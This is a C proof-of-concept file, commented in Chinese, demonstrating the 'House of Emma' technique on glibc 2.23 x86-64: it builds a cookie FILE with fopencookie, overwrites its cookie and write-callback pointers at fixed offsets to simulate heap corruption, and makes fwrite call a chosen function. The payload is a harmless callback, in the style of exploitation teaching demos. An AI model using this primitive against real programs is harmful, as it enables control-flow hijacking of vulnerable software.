#define _GNU_SOURCE
/*
 * 手法：通过 `_IO_cookie_jumps` 到达用户可控回调的 House of Emma，适用于 glibc 2.23，x86-64。
 *
 * 2.23 的 `_IO_cookie_file.__io_functions` 仍保存明文函数指针。这里先用
 * `fopencookie` 创建一个拥有合法 `_IO_cookie_jumps` 的真实对象，再模拟堆
 * overflow/UAF，覆盖 `__cookie` 与 write callback。`fwrite` 最终经过合法
 * primary vtable 调用攻击者函数。
 *
 * 2.24 的 983fd5c 开始对四个 callback 做 PTR_MANGLE；不要把本文件延伸到
 * 2.24+，应改用可从已知 callback 反推 pointer_guard 的另一份 PoC。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

static void *expected_cookie;
static int callback_count;

static ssize_t benign_write(void *cookie, const char *buffer, size_t size)
{
    (void)cookie;
    (void)buffer;
    return (ssize_t)size;
}

static ssize_t emma_callback(void *cookie, const char *buffer, size_t size)
{
    callback_count++;
    assert(cookie == expected_cookie);
    assert(size == 4);
    assert(memcmp(buffer, "EMMA", 4) == 0);
    puts("[+] Emma 2.23：明文回调命中");
    return (ssize_t)size;
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    cookie_io_functions_t functions;
    memset(&functions, 0, sizeof(functions));
    functions.write = benign_write;

    uint64_t original_cookie = 0x1111111111111111ULL;
    uint64_t controlled_cookie = 0x454d4d415f323233ULL;
    FILE *fp = fopencookie(&original_cookie, "w", functions);
    assert(fp != NULL);
    assert(setvbuf(fp, NULL, _IONBF, 0) == 0);

    /* x86-64 `_IO_cookie_file`：FILE +0xd8 vtable 后，+0xe0 是 cookie，
       read/write/seek/close 依次位于 +0xe8/+0xf0/+0xf8/+0x100。 */
    void **cookie_slot = (void **)((char *)fp + 0xe0);
    uintptr_t *write_slot = (uintptr_t *)((char *)fp + 0xf0);
    assert(*write_slot == (uintptr_t)benign_write); /* 2.23 必须是明文。 */

    expected_cookie = &controlled_cookie;
    *cookie_slot = expected_cookie;
    *write_slot = (uintptr_t)emma_callback;         /* 漏洞模拟。 */

    assert(fwrite("EMMA", 1, 4, fp) == 4);
    assert(callback_count == 1);
    fclose(fp);
    return 0;
}
